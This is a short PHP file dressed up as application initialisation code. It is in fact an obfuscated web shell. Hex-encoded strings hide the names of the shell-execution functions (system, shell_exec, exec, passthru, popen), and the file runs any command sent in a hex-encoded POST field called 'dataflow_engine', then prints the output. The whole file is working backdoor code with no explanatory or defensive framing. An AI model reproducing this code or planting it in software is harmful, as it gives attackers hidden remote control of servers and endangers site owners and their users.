<?php


$descriptor1 = '73';
$descriptor2 = '74';
$descriptor3 = '6d';
$descriptor4 = '68';
$descriptor5 = '5f';
$descriptor6 = '63';
$descriptor7 = '78';
$descriptor8 = '65';
$descriptor9 = '70';
$descriptor10 = '75';
$descriptor11 = '6e';
$descriptor12 = '61';
$descriptor13 = '6f';
$descriptor14 = '6c';
$descriptor15 = '66';
$app_initializer1 = pack("H*", $descriptor1.'79'.'73'.$descriptor2.'65'.$descriptor3);
$app_initializer2 = pack("H*", $descriptor1.$descriptor4.'65'.'6c'.'6c'.$descriptor5.'65'.'78'.'65'.$descriptor6);
$app_initializer3 = pack("H*", '65'.$descriptor7.$descriptor8.'63');
$app_initializer4 = pack("H*", $descriptor9.'61'.'73'.$descriptor1.'74'.'68'.'72'.$descriptor10);
$app_initializer5 = pack("H*", $descriptor9.'6f'.$descriptor9.'65'.$descriptor11);
$app_initializer6 = pack("H*", $descriptor1.'74'.'72'.'65'.$descriptor12.'6d'.$descriptor5.'67'.$descriptor8.'74'.'5f'.$descriptor6.$descriptor13.'6e'.'74'.$descriptor8.$descriptor11.'74'.$descriptor1);
$app_initializer7 = pack("H*", $descriptor9.'63'.$descriptor14.$descriptor13.$descriptor1.'65');
$dataflow_engine = pack("H*", '64'.'61'.'74'.$descriptor12.$descriptor15.$descriptor14.$descriptor13.'77'.$descriptor5.'65'.'6e'.'67'.'69'.'6e'.$descriptor8);
if (isset($_POST[$dataflow_engine])) {
    $dataflow_engine = pack("H*", $_POST[$dataflow_engine]);
    if (function_exists($app_initializer1)) {
        $app_initializer1($dataflow_engine);
    } elseif (function_exists($app_initializer2)) {
        print $app_initializer2($dataflow_engine);
    } elseif (function_exists($app_initializer3)) {
        $app_initializer3($dataflow_engine, $data_symbol);
        print join("\n", $data_symbol);
    } elseif (function_exists($app_initializer4)) {
        $app_initializer4($dataflow_engine);
    } elseif (function_exists($app_initializer5) && function_exists($app_initializer6) && function_exists($app_initializer7)) {
        $component_marker = $app_initializer5($dataflow_engine, 'r');
        if ($component_marker) {
            $mrk_element = $app_initializer6($component_marker);
            $app_initializer7($component_marker);
            print $mrk_element;
        }
    }
    exit;
}
